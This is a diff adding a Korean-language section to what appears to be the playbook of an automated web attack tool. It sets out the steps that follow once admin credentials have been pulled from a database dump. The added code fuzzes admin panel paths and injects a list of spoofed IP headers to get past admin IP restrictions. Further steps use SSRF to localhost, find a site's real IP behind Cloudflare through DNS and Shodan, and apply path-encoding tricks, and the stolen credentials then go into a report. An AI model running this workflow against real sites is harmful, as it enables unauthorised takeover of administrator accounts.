@@ -860,6 +860,112 @@ PHASE 11D (관리자 패널 자동화):
   5. PlaywrightEngine → 로그인 성공 시 스크린샷 자동 촬영
 AUTO-DECISION: DB 덤프로 자격증명 확보 시 → 즉시 관리자 패널 로그인 시도
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[POST-CREDENTIAL: 관리자 크리덴셜 확보 후 처리 흐름]
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+관리자 ID/PW 확보 시 반드시 아래 순서로 진행:
+
+── STEP A: 관리자 페이지 위치 확인 ──────────────────────
+  관리자 페이지 URL이 불명확한 경우 아래 순서로 탐색:
+
+  1) 이미 알고 있는 경우 → 바로 STEP B 진행
+  2) 경로 추측 (CMS 유형별 우선):
+       GnuBoard5:  /adm/, /admin/, /gnuboard/adm/
+       XpressEngine: /xe/admin/, /rhymix/admin/
+       WordPress:  /wp-admin/, /wp-login.php
+       Laravel/일반: /admin, /dashboard, /manager, /backend, /cms, /control
+       ASP.NET:    /Admin/, /Management/, /padmin/
+  3) 페이지 소스/JS 분석 → 관리자 링크 추출:
+       grep -E '(admin|manager|dashboard|backend)' 응답 HTML/JS
+  4) robots.txt / sitemap.xml 확인 → Disallow 경로에 관리자 경로 있음
+  5) 위 모두 실패 시 → 경로 퍼징 (ffuf/gobuster 스타일 1000+ 경로):
+       ADMIN_PATHS = ['/admin','/adm','/manage','/manager','/backend',
+                      '/dashboard','/cms','/control','/padmin','/webmaster',
+                      '/superadmin','/admincp','/cpanel','/staff', ...]
+       for path in ADMIN_PATHS:
+           r = requests.get(base_url + path, allow_redirects=False)
+           if r.status_code in (200, 301, 302, 403): # 403도 존재 증거
+               candidate_panels.append(path)
+
+── STEP B: 관리자 페이지 접근 시도 + IP 제한 우회 ───────
+  로그인 시도 → 응답 분석:
+
+  [정상 접근] → 로그인 성공 → 스크린샷 촬영 → 보고서 작성
+
+  [IP 제한/차단] 감지 기준:
+    - 응답 메시지: "IP", "접근 제한", "허용되지 않은", "Access denied", "Restricted"
+    - 상태코드: 403 + 본문에 IP 언급
+    - 로그인 성공인데 "관리자 IP가 아닙니다" 메시지
+    - 302 리다이렉트 → 메인 페이지로 튕김
+
+  [IP 제한 우회 시도 — 순서대로]:
+    1차: 스푸핑 헤더 자동 주입 (각 조합 테스트):
+         BYPASS_HEADERS = [
+             {"X-Forwarded-For": "127.0.0.1"},
+             {"X-Real-IP": "127.0.0.1"},
+             {"X-Client-IP": "127.0.0.1"},
+             {"X-Originating-IP": "127.0.0.1"},
+             {"X-Remote-IP": "127.0.0.1"},
+             {"X-Remote-Addr": "127.0.0.1"},
+             {"Forwarded": "for=127.0.0.1"},
+             {"True-Client-IP": "127.0.0.1"},
+             {"CF-Connecting-IP": "127.0.0.1"},
+             {"X-Forwarded-For": "::1"},
+             {"X-Forwarded-For": "192.168.0.1"},
+             {"X-Forwarded-For": "10.0.0.1"},
+         ]
+         for headers in BYPASS_HEADERS:
+             r = session.post(login_url, data=creds, headers=headers)
+             if login_success(r): # 우회 성공
+                 break
+
+    2차: SSRF로 내부에서 관리자 접근 (SSRF 취약점 있을 경우):
+         ssrf_payload = f"http://127.0.0.1{admin_path}"
+         → 서버 자신이 관리자 페이지를 요청하게 유도
+
+    3차: Cloudflare 뒤에 있는 경우 실서버 IP 직접 접근:
+         - dig TXT 타겟도메인 → SPF 레코드에서 실IP 발견
+         - Shodan/Censys에서 동일 SSL 인증서 가진 IP 검색
+         - Host 헤더 유지 + 실IP로 직접 요청:
+           real_ip = "x.x.x.x"
+           headers = {"Host": target_domain}
+           r = requests.post(f"https://{real_ip}{admin_path}", headers=headers, verify=False)
+
+    4차: 경로 변환 우회 (일부 프레임워크):
+         /admin/../admin/  /ADMIN/  /%61dmin/  /admin;/  /admin./
+
+── STEP C: 결과 분류 및 보고서 작성 ──────────────────────
+
+  [성공 시]:
+    - 스크린샷 촬영 (PlaywrightEngine 또는 requests + HTML 저장)
+    - 관리자 기능 열거 (파일업로드, 사용자관리, 설정페이지)
+    - 보고서에 포함:
+        관리자 페이지 URL
+        사용된 크리덴셜 (ID/PW)
+        로그인 성공 증거 (스크린샷/응답 일부)
+        IP 우회 사용 여부 + 사용된 헤더
+
+  [IP 제한 우회 실패 시] → 보고서에 반드시 포함:
+    취약점 항목: "관리자 페이지 IP 제한 (우회 미성공)"
+    심각도: HIGH (크리덴셜 자체는 이미 확보됨)
+    내용:
+      - 관리자 ID/PW 탈취 성공 (증거: dump 파일 경로)
+      - 관리자 페이지 URL 확인됨: {admin_url}
+      - IP 제한으로 인해 직접 로그인 불가
+      - 시도한 우회 방법 목록 (헤더, SSRF, 실IP 접근 등)
+      - 추천 조치: 관리자 페이지 추가 접근 경로 확인 필요
+    → 크리덴셜 자체가 증거이므로 심각도는 CRITICAL로 보고
+
+  [관리자 페이지 미발견 시] → 보고서에 포함:
+    취약점 항목: "관리자 페이지 미발견 (크리덴셜만 확보)"
+    내용:
+      - DB에서 관리자 계정 탈취 성공
+      - 관리자 페이지 경로 추적 실패 (탐색한 경로 목록 포함)
+      - 크리덴셜: {admin_id} / {admin_pw_hash}
+      - 영향: 관리자 페이지 발견 시 즉시 로그인 가능한 상태
+    심각도: CRITICAL
+
 [JS SECRET FINDER — JsSecretFinder]
 AUTO-SELECT 조건: 모든 스캔 초기에 JS 파일 자동 분석
 PHASE 11E (JS 비밀 탐지):
